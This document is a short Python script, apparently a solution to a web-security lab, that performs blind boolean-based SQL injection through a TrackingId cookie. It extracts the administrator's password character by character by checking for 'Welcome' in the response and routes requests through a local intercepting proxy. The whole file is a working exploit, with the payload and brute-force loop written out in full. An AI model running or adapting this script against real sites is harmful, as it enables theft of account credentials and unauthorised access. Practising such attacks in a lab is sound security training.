import re
import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}



def sqli_password(url):
    password_extracted = ''
    for i in range(1,21):
        for j in range(32, 126): #ascii character range
            sqli_payload = f"' and (select ascii(substring(password,{i},1)) from users where username='administrator')='{j}'--"
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookie = {'TrackingId': 'B4vM8CwYcYykJKsm' + sqli_payload_encoded, 'session': 'injG15bhLDLYcZ21JxOl3hEulyV66F7E'}
            r = requests.get(url, cookies=cookie, verify=False, proxies=proxies)
            if 'Welcome' not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break



def main():
    if len(sys.argv) != 2:
        print(f'[+] Usage: {sys.argv[0]} <url>')
        print(f'[+] Example: {sys.argv[0]} www.example.com')
    url = sys.argv[1]
    print('[+] Retrieving Administrator password...')
    sqli_password(url)

if __name__ == '__main__':
    main()